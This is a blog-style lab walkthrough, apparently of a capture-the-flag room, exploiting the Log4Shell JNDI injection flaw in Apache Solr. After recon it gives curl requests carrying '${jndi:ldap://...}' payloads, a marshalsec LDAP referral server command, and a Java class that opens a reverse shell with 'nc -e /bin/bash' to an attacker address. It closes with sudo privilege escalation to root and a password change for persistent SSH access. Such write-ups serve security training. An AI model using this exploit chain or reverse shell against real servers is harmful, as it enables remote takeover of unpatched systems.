---
published: true
---
With CVE-2021-44228 vulerability (Log4Shell) posing a major threat to Java applications hosted on the internet with a CVSS score of 10.0 critical designation. Remote code execution can be accomplished by taking advantage of a Java Naming and Directory Interface (JNDI) within Log4j logging packages. Solar provides a test scenairo for exploitation of vulnerability.  

----------

Legal Notice && Usage: *The information provided by executeatwill is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*
*By continuing, you acknowledge the aforementioned user risk/responsibilities.*

----------


# Reconnaissance

## Enumeration

Nmap scan:

    nmap -v -p- 10.10.212.184

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640108734185_image.png)





futher enumerate port 8983

    nmap -sV -p 8983 10.10.212.184

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640105066145_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640105737675_image.png)

# Discovery


## Http Server

navigate to `http://10.10.212.184:8983`

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640105787116_image.png)


Argument set for `-Dsolr.log.dir` set to `/var/solr/logs`

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640105901767_image.png)


**Downloaded Task Files**

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640105925136_image.png)


within the `solr.log` file we can discover and example of the solr log file that is normally generated.

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640105981072_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640105970426_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640106058730_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640106016837_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640106165663_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640106156327_image.png)



# Proof of Concept

navigate to `http://10.10.212.184:8983/solr/admin/cores`

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640106253666_image.png)



## log4j payload

    ${jndi:ldap://ATTACKERCONTROLLEDHOST}

**Creating a test scenario**

Adding a callback request from target to local attacking machine would allow a local listener to capture any incoming request

Listener setup on port 9999 locally and payload is sent via curl:

    curl 'http://10.10.212.184:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.159.175:9999\}'

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640106763648_image.png)


successful connection from target system to attacking system can be established by crafted injection to the `?foo` parameter.


**setup local LDAP server**

    java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://YOUR.ATTACKER.IP.ADDRESS:8000/#Exploit"

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640109159869_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640109171679_image.png)


**craft java reverse shell** 
on attacking machine create an exploit.


    public class Exploit {
        static {
            try {
                java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

compile java exploit code:

    javac Exploit.java -source 8 -target 8

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640107727782_image.png)


newly created `Exploit.class` file that will be hosted locally and sent to target via the jndi payload.

**send payload**

    curl 'http://10.10.212.184:8983/solr/admin/cores?foo=$\{jndi:ldap://10.6.124.83:1389/Exploit\}'

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640109326110_image.png)
![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640109333074_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640109310919_image.png)



# Persistence

Establishing a foothold on box as `solr`

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640109529895_image.png)

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640109516480_image.png)


Check sudo `sudo -l`

![](https://paper-attachments.dropbox.com/s_4C31D92121B5397E4506924129A1049C5736F2C26BE442BDBC951E9B5534A554_1640109599279_image.png)


called `"/bin/bash"` with sudo for a root shell.

changing password of `solr` for the ability to ssh into target.




